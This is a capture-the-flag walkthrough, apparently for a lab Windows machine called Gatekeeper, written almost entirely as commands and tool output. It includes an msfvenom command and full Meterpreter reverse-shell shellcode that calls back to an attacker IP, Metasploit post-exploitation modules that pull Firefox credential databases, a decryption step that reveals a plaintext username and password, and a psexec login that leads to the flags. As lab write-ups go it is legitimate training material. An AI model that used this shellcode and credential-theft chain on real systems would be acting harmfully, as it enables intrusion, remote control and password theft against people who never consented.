```
export IP=10.10.12.210

Nmap
--------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
31337/tcp open  Elite?       syn-ack ttl 127
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
--------------------------------

SMB
--------------------------------
smbclient -L $IP
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
--------------------------------

In share folder, we have gatekeeper.exe.
Exploit.py

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.12.130 LPORT=5555 -b "\x00\x0a" -f py --var-name shellcode
--------------------------------
shellcode =  b""
shellcode += b"\xbe\xcd\x31\xec\xd2\xda\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x59\x83\xc2\x04\x31\x72\x10"
shellcode += b"\x03\x72\x10\x2f\xc4\x10\x3a\x20\x27\xe9\xbb"
shellcode += b"\x5e\xa1\x0c\x8a\x4c\xd5\x45\xbf\x40\x9d\x08"
shellcode += b"\x4c\x2b\xf3\xb8\xc7\x59\xdc\xcf\x60\xd7\x3a"
shellcode += b"\xe1\x71\xd6\x82\xad\xb2\x79\x7f\xac\xe6\x59"
shellcode += b"\xbe\x7f\xfb\x98\x87\xc9\x71\x75\x55\x41\x2b"
shellcode += b"\x99\xd1\x17\xf0\x98\x35\xc0\x83\xda\xcd\x6a"
shellcode += b"\x53\xae\x61\x74\x84\x1e\xf1\x3e\x3c\x15\x5d"
shellcode += b"\x9f\x3d\xfa\xdb\x16\x49\xc0\xd2\x57\xfb\xb3"
shellcode += b"\x21\x23\xfd\x15\x78\xf3\x52\x58\xb4\xfe\xab"
shellcode += b"\x9d\x73\xe1\xd9\xd5\x87\x9c\xd9\x2e\xf5\x7a"
shellcode += b"\x6f\xb0\x5d\x08\xd7\x14\x5f\xdd\x8e\xdf\x53"
shellcode += b"\xaa\xc5\x87\x77\x2d\x09\xbc\x8c\xa6\xac\x12"
shellcode += b"\x05\xfc\x8a\xb6\x4d\xa6\xb3\xef\x2b\x09\xcb"
shellcode += b"\xef\x94\xf6\x69\x64\x36\xe0\x0e\x85\xc8\x0d"
shellcode += b"\x53\x11\x04\xc0\x6c\xe1\x02\x53\x1e\xd3\x8d"
shellcode += b"\xcf\x88\x5f\x45\xd6\x4f\xd6\x41\xe9\x80\x50"
shellcode += b"\x01\x17\x21\xa0\x0b\xdc\x75\xf0\x23\xf5\xf5"
shellcode += b"\x9b\xb3\xfa\x23\x31\xbe\x6c\xc6\xcc\xb2\xee"
shellcode += b"\xbe\xcc\xca\xfb\x8d\x59\x2c\x53\xa2\x09\xe1"
shellcode += b"\x14\x12\xe9\x51\xfd\x78\xe6\x8e\x1d\x83\x2d"
shellcode += b"\xa7\xb4\x6c\x9b\x9f\x20\x14\x86\x54\xd0\xd9"
shellcode += b"\x1d\x11\xd2\x52\x97\xe5\x9d\x92\xd2\xf5\xca"
shellcode += b"\xc4\x1c\x06\x0b\x61\x1c\x6c\x0f\x23\x4b\x18"
shellcode += b"\x0d\x12\xbb\x87\xee\x71\xb8\xc0\x11\x04\x88"
shellcode += b"\xbb\x24\x92\xb4\xd3\x48\x72\x34\x24\x1f\x18"
shellcode += b"\x34\x4c\xc7\x78\x67\x69\x08\x55\x14\x22\x9d"
shellcode += b"\x56\x4c\x96\x36\x3f\x72\xc1\x71\xe0\x8d\x24"
shellcode += b"\x02\xe7\x71\xba\x2d\x40\x19\x44\x6e\x70\xd9"
shellcode += b"\x2e\x6e\x20\xb1\xa5\x41\xcf\x71\x45\x48\x98"
shellcode += b"\x19\xcc\x1d\x6a\xb8\xd1\x37\x2a\x64\xd1\xb4"
shellcode += b"\xf7\x97\xa8\xb5\x08\x58\x4d\xdc\x6c\x59\x4d"
shellcode += b"\xe0\x92\x66\x9b\xd9\xe0\xa9\x1f\x5e\xfa\x9c"
shellcode += b"\x02\xf7\x91\xde\x11\x07\xb0"
--------------------------------

use exploit/multi/handler to get rev shell and set payload to windows/meterpreter/reverse_tcp and get a reverse shell.

user.txt.txt
===============================
{H4lf_W4y_Th3r3}
===============================

In meterpreter, run post/windows/gather/enum_applications
--------------------------------
[*] Enumerating applications installed on GATEKEEPER

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 Amazon SSM Agent                                                    2.3.842.0
 Amazon SSM Agent                                                    2.3.842.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 75.0 (x86 en-US)                                    75.0


[+] Results stored in: /root/.msf4/loot/20200906163210_default_10.10.12.210_host.application_387223.txt
--------------------------------

and run post/multi/gather/firefox_creds
--------------------------------
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /root/.msf4/loot/20200906163321_default_10.10.12.210_ff.ljfn812a.cert_633124.bin
[+] Downloaded cookies.sqlite: /root/.msf4/loot/20200906163328_default_10.10.12.210_ff.ljfn812a.cook_340896.bin
[+] Downloaded key4.db: /root/.msf4/loot/20200906163335_default_10.10.12.210_ff.ljfn812a.key4_542956.bin
[+] Downloaded logins.json: /root/.msf4/loot/20200906163339_default_10.10.12.210_ff.ljfn812a.logi_095603.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default
--------------------------------

Renaming files and using firefox decryptor to decrypt the files 
--------------------------------
python firefox_decrypt.py /root/.msf4/loot/

Master Password for profile /root/.msf4/loot/: 
2020-09-06 16:39:50,536 - WARNING - Attempting decryption with no Master Password

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
--------------------------------
psexec.py mayor@$IP

c:\Users\mayor\Desktop>type root.txt.txt
{Th3_M4y0r_C0ngr4tul4t3s_U}
```